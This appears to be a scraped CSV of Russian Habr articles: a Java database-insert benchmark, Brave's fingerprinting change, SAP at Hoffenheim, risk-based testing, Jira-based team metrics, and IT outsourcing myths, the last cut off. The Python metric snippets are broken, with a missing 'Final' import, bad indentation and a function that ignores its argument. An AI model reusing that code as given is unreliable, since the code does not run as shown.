  }
  
  protected static Void dictsCreate(Databases dbType, Statement st, Connection conn) throws ClassNotFoundException, SQLException
  {
    switch (dbType)
    {
      case MariaDB:
        st.execute(""drop table if exists address"");
        st.execute(""drop table if exists street"");
        st.execute(""drop table if exists city"");
        st.execute(""drop table if exists country"");
        st.execute(""create table country (id integer AUTO_INCREMENT primary key, country_code varchar(4), name varchar(150))"");
        st.execute(""create table city (id integer AUTO_INCREMENT primary key, country_id integer references country (id), name varchar(150))"");
        st.execute(""create table street (id integer AUTO_INCREMENT primary key, city_id integer references city (id), name varchar(150))"");
        st.execute(""create table address (id integer AUTO_INCREMENT primary key, street_id integer references street (id), flat integer, building varchar(5), house varchar(5))"");
        break;
      case PostgreSQL:
        st.execute(""drop table if exists address"");
        st.execute(""drop table if exists street"");
        st.execute(""drop table if exists city"");
        st.execute(""drop table if exists country"");
        st.execute(""create table country (id SERIAL primary key, country_code varchar(4), name varchar(150))"");
        st.execute(""create table city (id SERIAL primary key, country_id integer references country (id), name varchar(150))"");
        st.execute(""create table street (id SERIAL primary key, city_id integer references city (id), name varchar(150))"");
        st.execute(""create table address (id SERIAL primary key, street_id integer references street (id), flat integer, building varchar(5), house varchar(5))"");
        st.execute(""create index on city (country_id)""); // Postres doesn't create indexes on fk columns while other DBs do
        st.execute(""create index on street (city_id)"");
        st.execute(""create index on address (street_id)"");
        break;
    }
    return null;
  }

  protected static Void dropAll(Databases dbType, Statement st, Connection conn) throws SQLException, ClassNotFoundException
  {
    switch (dbType)
    {
      case MariaDB:
      case PostgreSQL:
        st.execute(""drop table if exists operation"");
        st.execute(""drop table if exists client"");
        st.execute(""drop table if exists address"");
        st.execute(""drop table if exists street"");
        st.execute(""drop table if exists city"");
        st.execute(""drop table if exists country"");
        break;
    }
    return null;
  }
  
  protected static Void clientInsert(int clientCount, int addressCount, Databases dbType, Statement st, Connection conn) throws ClassNotFoundException, SQLException
  {
    System.out.println(dbType);
    long t=System.currentTimeMillis();
    
    recreateClientAndOperation(dbType, st, conn);

    t = time(t,""Preparation"");
    
    PreparedStatement pst=conn.prepareStatement(""insert into client (name, last_name, address_id) values (?,?,?)"");
    insertClients(addressCount, clientCount, conn, pst);
    
    t = time(t,""Insert1"");
    
    st.execute(""create index name on client (name)"");
    conn.commit();
    
    t = time(t,""Indexing"");

    insertClients(addressCount, clientCount, conn, pst);
    
    t = time(t,""Insert2"");
    
    st.execute(""alter table client add constraint contr_address foreign key (address_id) references address (id)"");
    if (dbType==Databases.PostgreSQL) st.execute(""create index on client (address_id)"");
    conn.commit();
    
    t = time(t,""Altering table"");

    insertClients(addressCount, clientCount, conn, pst);

    t = time(t,""Insert3"");
    return null;
  }
  
  protected static Void dictsInsert(Databases dbType, Statement st, Connection conn) throws ClassNotFoundException, SQLException
  {
    byte bs[]=new byte[150];
    int countryCount=100, factor=50;
    long t=System.currentTimeMillis();
    PreparedStatement pst=conn.prepareStatement(""insert into country (name, country_code) values (?,?)"");
    insertRecords(100, 1, 150, pst, conn, bs, (i,ps)->ps.setString(2,""""+(i%10_000)));
    t = time(t,""Countries"");
    conn.commit();
    pst=conn.prepareStatement(""insert into city (name, country_id) values (?,?)"");
    insertRecords(countryCount, factor, 150, pst, conn, bs);
    t = time(t,""Cities"");
    conn.commit();
    pst=conn.prepareStatement(""insert into street (name, city_id) values (?,?)"");
    insertRecords(countryCount*factor, factor, 150, pst, conn, bs);
    t = time(t,""Streets"");
    conn.commit();
    pst=conn.prepareStatement(""insert into address (building, street_id, house, flat) values (?,?,?,?)"");
    insertRecords(countryCount*factor*factor, factor, 5, pst, conn, bs, (i,ps)->ps.setString(3,""""+(i%100_000)), (i,ps)->ps.setInt(4,i));
    t = time(t,""Addresses"");
    conn.commit();
    return null;
  }
  
  private interface ConsumerWithException
  { void accept(int i, PreparedStatement pst) throws SQLException; }
  
  private static void insertRecords(int parentCount, int factor, int strLen, PreparedStatement pst, Connection conn, byte[] bs, ConsumerWithException ... fieldValues) throws SQLException
  {
    RRef rr=new RRef();
    for (int i=0;i<parentCount*factor;i++)
    {
      String s=generateRandomString(strLen,bs,0);
      pst.setString(1,s);
      if (factor>1) pst.setInt(2,rr.nextRef(parentCount));
      for (ConsumerWithException r:fieldValues)
        r.accept(i,pst);
      pst.execute();
    }
    conn.commit();
  }

  private static void insertClients(int addressCount, int clientCount, Connection conn, PreparedStatement pst) throws SQLException
  {
    RRef rr=new RRef();
    byte bs[]=new byte[30];
    for (int i=0;i<clientCount;i++)
    {
      pst.setString(1,generateRandomString(30,bs,0));
      pst.setString(2,generateRandomString(30,bs,0));
      pst.setInt(3,rr.nextRef(addressCount));
      pst.execute();
    }
    conn.commit();
  }

  private interface Task<T>
  { T run(Databases dbType, Statement st, Connection conn) throws SQLException, ClassNotFoundException; }
  
  protected static <T> T db(Databases dbType, Task<T> task) throws SQLException, ClassNotFoundException
  {
    String connectionString = getConnectionString(dbType);
    try (Connection conn = DriverManager.getConnection(connectionString))
    {
      Statement st=conn.createStatement();
      conn.setAutoCommit(false);
      T t=task.run(dbType,st,conn);
      conn.commit();
      return t;
    }
  }

  private static String getConnectionString(Databases db) throws ClassNotFoundException
  {
    switch (db)
    {
      case MariaDB: Class.forName(""org.mariadb.jdbc.Driver""); break;
      case PostgreSQL: Class.forName(""org.postgresql.Driver""); break;
    }
    String connectionString = switch (db)
    {
      case MariaDB -> ""jdbc:mariadb://localhost:3306/test_db?user=aaa&password=12"";
      case PostgreSQL -> ""jdbc:postgresql://localhost:5432/test_db?currentSchema=test_schema&user=aaa&password=12"";
    };
    return connectionString;
  }

  private static long time(long t, String mark) {
    t=System.currentTimeMillis()-t;
    System.out.println(mark+"": ""+t);
    return System.currentTimeMillis();
  }
  
  public static String generateRandomString(int length, byte buffer[], int bufferOffset)
  {
    int n=length/8;
    if (length%8>0) n++;
    if (buffer==null) buffer=new byte[length];
    for (int j=0;j<n;j++)
    {
      long x=(long)(Math.random()*Long.MAX_VALUE);
      for (int k=0;k<8;k++)
      {
        int pos=j*8+k;
        if (pos>=length) break;
        pos=pos+bufferOffset;
        buffer[pos]=(byte)((x|32)&127);
        if (buffer[pos]==127) buffer[pos]=126;
        x=x>>8;
      }
    }
    return new String(buffer,0,length);
  }

  protected static long findShift(Databases type) throws SQLException, ClassNotFoundException
  {
    return db(type, (t,st,c)->
    {
      ResultSet rs=st.executeQuery(""select count(*) from operation"");
      rs.next();
      int n=rs.getInt(1);
      rs.close();
      return shiftRr(n);
    });
  }

  private static long shiftRr(int insertCount)
  {
    RRef rr=new RRef();
    for (int i=0;i<insertCount;i++)
      rr.nextRef(111);
    return rr.r;
  }
}Цель выкладывания класса с набором тестов состоит в уменьшении количества споров при интерпретации результатов. Все параметры СУБД, как было сказано ранее, остались равны значениям по умолчанию. Кроме параметров СУБД на результат влияют два фактора - сам набор тестов и тестовая машина. Используя один и тот же набор тестов (в прилагаемом классе), а так же одинаковые версии СУБД, мы должны получить одинаковые результаты на одинаковом железе. Поскольку железо, скорее всего, у всех будет разным, можно предложить следующую методику для получения однозначных результатов:Прилагаемые тесты запускаются на вашем железе, но на СУБД той же версии, что использовалась для подготовки этого текста. Первый запуск выполняется на СУБД с настройками по умолчанию, что даст нам набор коэффициентов, учитывающих разницу в железе (и ОС, если вам привычнее Linux). Результаты сравниваются с тестами, проводимыми кем-то ещё (например с результатом тестов в тексте), при помощи полученных коэффициентов. Дальнейшие запуски проводятся с любыми дополнительными настройками, но результаты всё так же можно домножить на коэффициенты и получить сравнимые данные при отличающихся параметрах оборудования. Так можно, например, показать, что при ваших настройках и на системе автора (при помощи коэффициентов) та или иная СУБД показала бы существенно лучшие результаты, при этом - вполне сравнимые друг с другом которые за счёт предложенной простой методики.Ну а если вдруг появится много желающих провести подобное модельное тестирование, то опять все участвующие смогут сравнивать свои результаты без длительных выяснений кто из них более всего прав. На чём, видимо, и стоит закончить затянувшуюся уже учёную беседу.",2024-01-26
Упрощаем систему защиты от фингерпринтинга в Brave,2,0,https://habr.com/ru/companies/brave/articles/788742/,"Начиная с версии Браузера Brave 1.64 для десктопов и андроида, которая будет выпущена через несколько месяцев, Brave отключит опцию агресивной блокировки цифровых отпечатков; эта мера уже реализована в тестовом режиме в Nightly-версиях браузера. Это никак не скажется на передовых механизмах защиты от фингерпринтинга, которые Brave предлагает своим пользователям, и позволит нам сосредоточиться на улучшении защитных механизмов в стандартном режиме, которые не приводят к проблемам с совместимостью.В настоящий момент Brave предоставляет два уровня защиты от фингерпринтинга, которые значительно усложняют жизнь трекерам, пытающимся идентифицировать вас в Сети: стандартный и агрессивный. Однако же, с течением времени мы заметили недостатки использования строго режима:При блокировке уязвимых для фингерпринтинга API строгий режим часто полностью или частично ломал правильное функционирование сайтов, что приводило к его бесполезности для большинства пользователей.Согласно нашей конфиденциальной аналитике, менее 0.5% пользователей Brave используют строгий режим защиты от фингерпринтинга.Столь незначительный размер этого сегмента наших пользователей сам по себе может ставить их под угрозу, т.к. применение строгого режима защиты от блокировки выделяет эту маленькую когорту пользователей. Мы не сталкивались с какими-либо проблемами вследствие этого, но рассматриваем эту угрозу как заслуживающую внимания, т.к. включение теми или иными пользователями этого режима могло быть продиктовано изначальной повышенной озабоченностью возможностью потенциально таргетированного трекинга.Поддержка этого режима и выяснение того, почему некоторые сайты ломаются, занимает время наших разработчиков, которое с большей пользой будет применено для работы над стандартными механизмами защиты конфиденциальности, которые нужны всем пользователям.В виду вышесказанного, мы решили отказаться от поддержки строгого режима блокировки фингерпринтинга. Наш стандартный режим покрывает обширное количество кейсов фингерпринтинга и является самым сильным механизмом подобной защиты среди всех популярных браузеров. Наша инновационная технология фарблинга, применяемая к значительному количеству основных подверженных фингерпринтингу сетевых API, значительно осложняет трекерам задачу достоверного получения уникального идентификатора вашего браузера. В будущем мы продолжим работу по усилению и расширению защитных мер, которые предлагает стандартный режим защиты от фингерпринтинга, с тем, чтобы все наши пользователи были защищены от трекеров и прочих любителей собирать цифровые отпечатки пользователей, будучи при этом уверенными в полной и ненарушенной совместимости этой защиты с нормальным функционированием сайтов.",2024-01-26
"И спорт, и софт: как деревенская футбольная команда «Хоффенхайм» штурмует Бундеслигу, и при чем здесь IT",3,1,https://habr.com/ru/companies/teamly/articles/788666/,"Футбольный клуб «Хоффенхайм» образовался в 1899 году, и в немецком футболе их называют деревенскими (ну как у нас «Локомотив» называют кочегарами), потому что до конца XX века клуб оставался любительской командой одноименной деревни с населением около 3000 человек. В начале девяностых «Хоффенхайм» все еще играла в Бециркслиге – это аж седьмой дивизион, почти на уровне дворовых команд. Но спустя 30 лет команда играет уже в топ-10 Бундеслиги (высший дивизион страны). Это результат упорного труда всей команды: тренера, игроков, и не последнее место занимает специальное ПО, разработанное под «Хоффенхайм».  «Хоффенхайм»Привет! Это команда TEAMLY. Мы разработали платформу для управления знаниями, командой и документами. Кейсы по оптимизации работы с помощью ПО нам особенно интересны, тем более, если результат прямо-таки налицо. Прям как в истории успеха «Хоффенхайма», изложенной в этой статье. Параллельно с ростом успеха «Хоффенхайма» активно развивается и SAP – компания-разработчик ПО, позже занявшая третье место в мире после Microsoft и Oracle. Один из основателей – Дитмар Хопп, – в молодости сам играл в «Хоффенхайм». Он не забыл родную команду и в 1990 году стал ее владельцем. С этого началось тесное сотрудничество SAP и «Хоффенхайм», которое продолжается и сейчас. В итоге команду теперь называют самым инновационным клубом Бундеслиги, которые задает стандарты подготовки и развития молодых игроков. По словам Яна Майера, управляющего директора TSG Hoffenheim, молодые таланты из его клуба достигают высшей лиги в 23% случаев, тогда как средний показатель в стране всего 3%. Для этого была разработана платформа SAP Sports One, которая включает мониторинг состояния здоровья и производительности игроков, персонализацию взаимодействия с болельщиками для повышения вовлеченности и лояльности, все бизнес-процессы также перенесены на платформу. На основе данных тренерский состав строит стратегию с прицелом на сезон или ближайшую игру, используются исторические данные и уникальная база накопленных знаний - всё это включено в общую архитектуру программы. В итоге, весь менеджмент футбольного клуба сосредоточен в рамках одного решения.Физические объекты, поддерживающие SAP Sports OneРазумеется, результаты футбольной команды напрямую зависят от тренировок. И для них были созданы технологические решения:Footbonaut – коробка размером 14х14 метров. В стены вмонтированы 72 полых куба, освещенных в разных секторах, куда игроки должны посылать мяч с разной скоростью и вращением. Все результаты, конечно, записываются для анализа и совершенствования техники тренировки. FootbonautHelix Arena – сценарий виртуальной реальности для тренировки когнитивных навыков. О такой игре, пожалуй, мечтают все мальчишки (да и девчонки тоже), в ней игроку предлагается решать смоделированные ситуации в режиме реального времени, как в одиночку так и в паре. Helix ArenaКакие знания используют в SAP Sports OneПрограммы работают через SAP Interactive Data Science – интерактивную комнату и пространство для совместной работы. Собранные данные и уникальный опыт копится в общей базе знаний, которые невозможно получить без физической тренировки. После обработки знаний можно моделировать другие, более сложные ситуации на поле, чтобы максимально отточить навыки и скорость принятия решений.Что копится в базе знаний:планы и результаты по каждой тренировке на основе характеристик игрока (сюда интегрированы носимые устройства, физические и психологические тесты и т.д.);результаты тестов на производительность;исторические данные игрового опыта команды;наблюдения медицинских показателей, профильные научные исследования и новости;оцифрованный прогресс каждого игрока и всей команды.На основе этого создаются программы тренировок, маршруты развития и обучения неофитов. Отдельной строкой стоит упомянуть работу с талантами. Чтобы достичь высокого уровня развития от новичка до игрока высшей лиги, SAP разработали собственную нейросеть. Она составляет сводные отчеты о скаутинге и обновляет рекомендации.Что копится в базе данных:результаты игр;данные о графике осмотров, тренировок, игры и т.д.;информация о здоровье.На базе этих данных разрабатывается стратегия, составляется планирование матчей, а также осуществляется взаимодействие с болельщиками - обновление информации на сайте, продажа билетов, вопросы и ответы. Таким образом, в SAP существуют отдельные мобильные приложения с доступом для менеджмента команды, игроков и тренеров. Каждый пользователь имеет собственный личный кабинет, где отображается актуальная для него информация. SAP Sports One на вооружении других клубов  Разумеется, программой не могли не заинтересоваться другие спортивные клубы. Сейчас SAP Sports One используют 80 клубов и федераций разных дисциплин в 18 странах (футбол, хоккей, баскетбол, гандбол и регби). Среди крупных бизнес-партнеров экосистемы есть и полноценный конкурент «Хоффенхайм» по Бундеслиге – футбольный клуб «Бавария» из Мюнхена. Кстати, 12 января «Хоффенхайм» проиграли «Баварии» 3:0. Помимо контроля  за здоровьем и тренировками, «Бавария» использует и другие плюшки SAP, разработанные специально под них. В первую очередь это касается фанатского комьюнити. «Бавария» – клуб известный во всем мире, несравнимо (пока?) с «Хоффенхайм». Что придумали для них:приложение для использования на стадионе: в нем можно заказать еду и узнать статус заказа, а также организовать доставку прямо к креслу, чтобы не отвлекаться от игры;фанатское приложение, куда объединили данные из 52 систем, включая потребности и интересы, чтобы помогает персонализации предложений.В истории клуба «Хоффенхайм» главное для нас – это умелое обращение с менеджментом знаний. SAP сумели не просто создать экосистему, объединяющую руководство, игроков и фанатов клуба, но и грамотно встроить в нее процессы обучения, анализа прошлого опыта и управления талантами. Именно это стало важнейшим шагом на пути от местечковой любительской команды до статуса одного из ведущих клубов страны. Рекламная паузаПриходите 20 февраля в 12:00 на наш вебинар. Расскажем, как управлять задачами команды разработки в умных таблицах, которые есть в TEAMLY. Вебинар строго прикладной – бери и делай, что называется. Мероприятие пройдет онлайн, в целом, и ходить далеко не надо. ",2024-01-26
Тестирование на основе рисков,3,1,https://habr.com/ru/articles/789072/,"В быстроменяющемся мире разработки ПО необходимость в эффективных стратегиях тестирования становится как никогда актуальной. Среди различных подходов выделяется тестирование на основе рисков, которое оптимизирует усилия по тестированию и обеспечивает разумное распределение ресурсов.Что такое тестирование на основе рисков?Тестирование, основанное на рисках — это метод, при котором усилия по тестированию приоритизируются на основе степени потенциального влияния и вероятности ошибки.Вместо применения единого подхода к тестированию всех функциональных возможностей приложения, эта стратегия предполагает выявление и оценку потенциальных рисков, связанных с различными функциями и частями.Сосредоточившись на областях с повышенным риском, тестировщики могут максимизировать шансы на обнаружение критических проблем и обеспечить более надёжный и качественный продукт.Процесс тестирования на основе рисков1. Выявление рисковНачните с определения потенциальных рисков, связанных с каждой особенностью или функциональностью ПО. Сотрудничайте с заказчиками, разработчиками и членами QA-команды, чтобы получить представление о возможных проблемах.2. Оценка рисковОцените каждый выявленный риск с точки зрения его значимости и вероятности возникновения. Используйте матрицы рисков или системы начисления баллов, чтобы присвоить рискам числовые значения для более точной расстановки приоритетов.3. Планирование тестированияВключите выявленные риски в общий план тестирования. Расставьте приоритеты тест-кейсов в зависимости от уровня риска, связанного с каждой функцией.4. Разработка тест-кейсовПодготовьте тест-кейсы, направленные на области с повышенным риском. Убедитесь, что тест-кейсы охватывают разнообразные сценарии тестирования.5. Выполнение и мониторингПроведите тесты в соответствии с планом. Отслеживайте и документируйте результаты, уделяя пристальное внимание проблемам, выявленным в областях с высоким риском.6. Повторная оценка рисковРегулярно проводите переоценку рисков на протяжении всего цикла разработки. Обновляйте стратегию тестирования с учётом динамики развития проекта и вновь выявленных рисков.Оценка рисковОценка рисков при тестировании ПО включает выявление потенциальных проблем, оценку степени их влияния и вероятности возникновения. Ниже приведена пошаговая инструкция для оценки рисков.1. Определение потенциальных рисковВзаимодействуйте с членами команды для идентификации потенциальных рисков, связанных с тестируемым ПО. Рассмотрите различные аспекты, включая требования, дизайн, реализацию и внешние факторы, которые могут повлиять на ПО.2. Классификация рисковРазделите выявленные риски на различные категории, например, технические, операционные и бизнес-риски. Такое разделение помогает упорядочить и приоритизировать риски на основе их характера и потенциального влияния.3. Обозначение критериев рисковУстановите чёткие критерии для оценки и определения приоритетности рисков. Общие критерии включают влияние на функциональность, впечатления пользователей, вероятность возникновения и влияние на бизнес-процессы.Определите систему оценки рисков.4. Количественная и качественная оценка рисковНазначьте числовые значения или качественные дескрипторы на основе установленных критериев. Например, используйте шкалу от 1 до 5 для оценки влияния и вероятности, где 1 – низкий уровень, а 5 – высокий.5. Создание матрицы рисковРазработайте матрицу рисков, которая визуализирует взаимосвязь между влиянием и вероятностью. Внесите каждый выявленный риск в матрицу, чтобы определить его общий уровень.6. Определение приоритетности рисковРасставьте приоритеты рисков на основе их положения в матрице. Риски с высокой степенью влияния и вероятностью возникновения должны рассматриваться как самые важные.7. Документирование рисковСоздайте подробный реестр рисков, в котором будут отражены все выявленные риски, их потенциальное влияние, вероятность возникновения, а также рекомендуемые действия по снижению вероятности появления.Поддерживайте этот документ на протяжении всего цикла разработки ПО, обновляя его по мере появления новых или изменения существующих рисков.8. Согласование с заинтересованными сторонамиУтвердите выявленные риски и их оценки с заинтересованными сторонами, включая руководителей проекта, разработчиков и заказчиков. Убедитесь, что все участники согласны с предполагаемыми рисками и их приоритетами.9. Повторная оценка и обновление рисковРегулярно пересматривайте и обновляйте оценку рисков во время реализации проекта. Могут появиться новые риски, а влияние или вероятность появления существующих рисков может измениться в зависимости от хода проекта.10. Интеграция с ходом тестированияИнтегрируйте выявленные риски в общий процесс планирования тестирования. Распределите ресурсы и усилия по тестированию на основе приоритетов рисков.Рекомендации для успешного тестирования на основе рисковПоддерживайте открытое общение между членами команды для сбора различных точек зрения на потенциальные риски.Во время работы над проектом степень влияния рисков может меняться. Регулярно обновляйте оценки рисков, чтобы они отражали текущее состояние проекта.Уделяйте особое внимание областям с повышенным риском, но также обеспечьте базовый уровень тестирования всех функциональных возможностей, чтобы полностью протестировать приложение.Внедрение стратегий тестирования на основе рисков в процесс контроля качества может значительно повысить эффективность тестирования. Сосредоточившись на более рискованных областях продукта, вы не только увеличите шансы на выявление критических проблем, но также более эффективно распределите ресурсы.",2024-01-26
Метрики команды разработки,2,0,https://habr.com/ru/articles/788930/,"ВведениеЗаказчику задачи в конечном счёте всё равно, какой методологией управления разработкой пользуется команда исполнителей - точная дата получения результата для него важнее.Чтобы называть эту дату более обоснованно, необходимо понимать, как на самом деле работает команда: сколько поставляет задач, как долго проходит процесс анализа задачи перед взятием в работу, на каких этапах в целом происходит ""застревание"" задачи.TL;DR - Вот ссылка на репозиторий с python-кодом, который считает метрики из статьи по jira и рисует графики для наглядности (merge requests are very welcome). Ниже - описание метрик и способы их расчёта.Disclaimer: для расчёта использовались обезличенные данные нескольких компаний с примесью синтетики.Предлагаемый подходПрежде всего надо выделить то множество задач, для которого будут рассчитаны метрики.Также следует определить множество статусов, которые мы будет считать ""финальными"". Например, задача может быть как выполнена, так и отклонена - оба статуса в определённом смысле ""финальные"".Для каждой задачи из выделенного множества нам будут интересны следующие свойства:Текущий статусДата созданияДата первого изменения статуса (считаем датой начала работы над задачей)Дата последнего перехода в финальный статус (считаем датой окончания работы над задачей)Время нахождения в каждом статусеВремя нахождения на каждом из исполнителей@dataclass
class Issue:
    key: str
    status: str

    created_at: datetime
    first_status_change_at: datetime = None
    last_finish_status_at: datetime = None

    doers_x_periods: dict[str, timedelta] = None
    statuses_x_periods: dict[str, timedelta] = None

    @property
    def is_done(self) -> bool:
        return self.last_finish_status_at is not None

    @property
    def lead_time(self) -> timedelta | None:
        if not self.last_finish_status_at:
            return None

        return self.last_finish_status_at - self.created_at

    @property
    def cycle_time(self) -> timedelta | None:
        if self.first_status_change_at and self.last_finish_status_at:
            return self.last_finish_status_at - self.first_status_change_at
        return None
МетрикиThroughputСколько задач делает команда разработки за определённый период времени?Пример кода с разбивкой результатов по календарным неделям:from collections import defaultdict
from metrics.entity import Issue


def get_throughput(list_of_issues: list[Issue]) -> dict[str, int]:
	tmp = defaultdict(int)
	for issue in list_of_issues:
	    if issue.is_done:
            key = issue.last_finish_status_at.strftime(""%YW%V"")  # example: 2024W03
                tmp[key] += 1
    return dict(tmp)Пример вывода:{
...
'2022W08': 2,
'2022W09': 8,
'2022W10': 5,
'2022W11': 4,
'2022W12': 9,
'2022W13': 12
...
}Визуализация с линейной регрессией:Видно, что delivery rate команды снижаетсяLead TimeСколько времени требуется, что довести задачу до конца?Пример кода с установленной гранулярностью расчёта в один день и лимитом в 30 дней:import typing as t

from metrics.entity import Issue

ONE_HOUR: Final[int] = 60 * 60
ONE_DAY: Final[int] = 24 * ONE_HOUR
CALC_LIMIT: Final[int] = 30

  def get_lead_time(
      list_of_issues: list[Issue],
      timeslot: int = ONE_DAY,
      limit: int = CALC_LIMIT,
  ) -> list[float]:
      res = []
      for issue in list_of_issues:
          if issue.lead_time:
              lead_time = max(1, issue.lead_time.total_seconds() // timeslot)
              lead_time = min(lead_time, limit)
              res.append(lead_time)
      return res
Визуализация без лимита:Cycle TimeСколько времени проходит между началом работы над задачей и её завершением?Пример кода:import typing as t

from metrics.entity import Issue

ONE_HOUR: Final[int] = 60 * 60
ONE_DAY: Final[int] = 24 * ONE_HOUR
CALC_LIMIT: Final[int] = 30
  
def get_cycle_time(
    self,
    list_of_issues: list[Issue],  
    timeslot: int = ONE_DAY,
    limit: int = CALC_LIMIT,
) -> list[float]:
    res = []
    for issue in self.repo.all():
        if issue.cycle_time:
            cycle_time = max(1, issue.cycle_time.total_seconds() // timeslot)
            cycle_time = min(cycle_time, limit)
            res.append(cycle_time)
    return resВизуализация с лимитом:QueuesСколько времени задачи проводят на каждом этапе работы?На мой взгляд - наиболее важная метрика, потому что позволяет определить узкие места процесса разработки.import typing as t

from metrics.entity import Issue

ONE_HOUR: Final[int] = 60 * 60
ONE_DAY: Final[int] = 24 * ONE_HOUR
CALC_LIMIT: Final[int] = 30
  
def get_queue_time(
    list_of_issues: list[Issue],
    timeslot: int = ONE_DAY,
    limit: int = CALC_LIMIT,
) -> dict[str, list[float]]:
    tmp = defaultdict(list)

    for issue in list_of_issues:
        for status, td in issue.statuses_x_periods.items():
            period_in_status = max(1, td.total_seconds() // timeslot)
            period_in_status = min(period_in_status, limit)
            tmp[status].append(period_in_status)

    return dict(tmp)Статус ""Анализ задачи""Статус ""Разработка""Статус ""Ожидает тестирования""Статус ""В тестировании""Если наивно подходить к данным, то для цикла ""анализ -> разработка -> ожидание тестирования -> тестирование"" наиболее ожидаемое затраченное время 2+2+1+2 = 7 рабочих дней.Оффтоп: смешно, но конкретно для данной компании этот расчёт оказался верен в ~80% случаев. После этого были приняты меры, чтобы уменьшить время в очередях ""Анализ"" и ""Ожидание тестирования"". Теперь укладываются в 5 дней.Наполнение даннымиТеперь, когда готовы все структуры данных и алгоритмы их обработки, можно начать наполнять систему данными. Для примера будем использовать Jira как источник сырых данных.Общий подход такой - для каждого источника сырых надо определить две составляющие:Откуда брать сырые данные (api, filesystem, db, etc)?Как приводить сырые данные в класс Issue?Примеры для решения обеих задач есть в репозитории, приводить их здесь, наверное, незачем.ЗаключениеПосле получение статистики и метрик не самой дурной идеей кажется попытка собрать простую ML-модель, чтобы попытаться ответить на два главных (с точки зрения заказчика) вопроса:Когда будет готова задача X?Какие задачи будут готовы к дате Y?Этим и займёмся в следующей статье.",2024-01-26
"Предубеждения об IT-аутсорсе, с которыми пора покончить",3,2,https://habr.com/ru/companies/cleverpumpkin/articles/789026/,"Есть мнение, что найм команды на аутсорсе — это всегда больший риск, чем разработка своими силами. При выборе сторонней команды в голове крутится множество страхов — а вдруг разработчики не смогут быстро погрузиться в проект, или у них не хватит опыта, или ваша конфиденциальная информация окажется у конкурентов… Мы решили собрать все претензии к такому способу реализации проектов и честно ответить на них. Что получилось — читайте в статье.Несколько лет назад Фонд NHS Foundation Больниц Кембриджского университета решил внедрить новую систему учета пациентов. Она должна была ускорить и упростить работу врачей. С помощью системы сотрудники больницы смогли бы получать доступ к информации о пациентах через компьютеры и смартфоны. Для выполнения этой задачи Фонд привлек компанию-разработчика цифровых технологий. Ожидания Фонда не оправдались — когда система была подключена, производительность работы упала на 20%. Сервис оказался неудобным для врачей, в данных попадались ошибки, из-за которых пациенты долго не могли получить нужное лечение. Причины провала были не только на стороне подрядчика — Фонд не учел масштабность проекта и не обучил сотрудников работе в системе. Поэтому врачам было сложно приспособиться к новому порядку. Но в СМИ эта история получила огласку именно как неудача специалистов на аутсорсе. Подобные ситуации провоцируют предрассудки вокруг такого способа реализации проектов. Аутсорс может быть сопряжен с рисками, но если знать несколько нюансов, их можно снизить или убрать совсем. Разбираем их по порядку.Предубеждение 1: команда на аутсорсе, скорее всего, сорвет срокиВы знаете как выстроены процессы у вас в компании. Стратегии работают, команды предсказуемы, тимлиды появляются на митингах каждую неделю и планируют нагрузку. А как будет у специалистов на аутсорсе — неизвестно. Возможно, команда гораздо менее слажена и работает, как придется. В таких условиях легко сорвать дедлайны. Это распространенный миф, хотя на деле оказывается совсем наоборот. Чаще всего у IT-студий процессы выстроены лучше, чем у инхаус-команд. В сфере разработки большая конкуренция и, чтобы удовлетворить желания заказчиков и заработать хорошую репутацию, нужно наладить работу идеально. Конечно, все зависит от компетентности подрядчика. Но, если обратиться к студии с хорошим опытом, вы с большей вероятностью получите заказ в срок. А если у команды уже есть кейсы по вашему направлению и она погружена в особенности рынка, то сможет предусмотреть сложности и заранее заложит необходимые ресурсы.Предубеждение 2: команда на аутсорсе = множество баговЕсть мнение, что IT-студии часто экономят на тестировщиках и, таким образом, уменьшают бюджет и время на разработку. Это приводит к тому, что программа, которая не была тщательно протестирована, выдает много багов после релиза.Этот вопрос также касается выбора команды. Опытные IT-студии обязательно привлекают к работе над проектом тестировщиков, и не только после завершения разработки. Например, в CleverPumpkin тестировщики подключаются еще на первых этапах создания приложения, чтобы проверить документацию и проследить за полнотой макетов. Если вы опасаетесь на счет качества вашего продукта, обговорите этот момент с проджект-менеджером студии перед началом работы. Спросите, на каком этапе проводится проверка и какие виды тестирования использует команда. Это поможет снизить риски и наладить контакт с командой.Предубеждение 3: у специалистов на аутсорсе множество заказчиков, поэтому они не вовлечены в продуктIT-студия выполняет много заказов одновременно. И существует мнение, что дизайнеры и программисты выполняют задачи, плохо понимая, о чем проект и его конечную цель. Это плохо отражается на качестве продукта и мешает его конкурентоспособности и успеху.Факт в том, что в студиях разработки несколько команд, каждая из которых работает над своими проектами. Так они лучше погружаются в суть задач. Также на вовлеченность влияет творческая свобода: у каждого разработчика должна быть возможность высказывать свои идеи. Даже инхаус-специалист вряд ли будет вкладываться в задачу, если ничего не знает про проект и не имеет права голоса. У нас в CleverPumpkin программисты знают, что их опыт важен и их идеи будут услышаны. Любая предложенная концепция обрабатывается проджект-менеджером. Если она оказывается полезной для продукта, мы предлагаем ее заказчику и реализуем. Так мы сохраняем вовлеченность всей команды в качество приложений.Предубеждение 4: инхаус-команда больше подходит для пострелизной поддержки Допустим, в приложении был выявлен баг, и его нужно срочно устранить. Кажется, что специалисты в штате с большей вероятностью оперативно включатся в работу и исправят ошибку. С аутсорсом все наоборот — вряд ли команда отложит все дела и займется проблемой.Как правило, пострелизная поддержка обговаривается перед разработкой и программисты на аутсорсе готовы быстро исправить баг. Если подобная ситуация возникает с приложением, разработанным нами, мы можем включиться в работу в течение дня. Но такое случается очень редко благодаря тщательному тестированию, без которого мы не выпускаем продукт. Иногда бывает, что проблема обнаруживается нами при пострелизной проверке данных аналитики. Тогда мы сразу сообщаем об этом заказчику и максимально оперативно исправляем ошибку.Предубеждение 5: для больших студий на аутсорсе ваше приложение станет «еще одним проектом»Логично, что у крупных подрядчиков много клиентов, и они будут уделять меньше внимания проекту, чем небольшие студии. А нишевые команды вкладывают в разработку больше усилий, так как им нужно конкурировать с другими и зарабатывать репутацию. Поэтому лучше обращаться к командам в 20-30 человек.Это спорный вопрос. С одной стороны в больших студиях уже налажены и отработаны рабочие процессы — с ними вы можете быть уверены в результате, который получите в срок. Но часто в таких компаниях проекты выполняются по единому стандарту, без глубокой менеджерской вовлеченности. Здесь выбор будет зависеть от проекта. Если вам нужно разработать, например, приложение для бизнес-аудитории со стандартным набором функций и привычными механиками, обратитесь в крупную студию. Особенно, если у нее уже много проектов из вашей сферы. А если нужно что-то более креативное, требующее нестандартного подхода, можно выбрать небольшую компанию, которая с удовольствием погрузится в ваш проект и поломает над ним голову. Но в конечном итоге все зависит от подрядчика — возможно, в большой компании будет талантливый 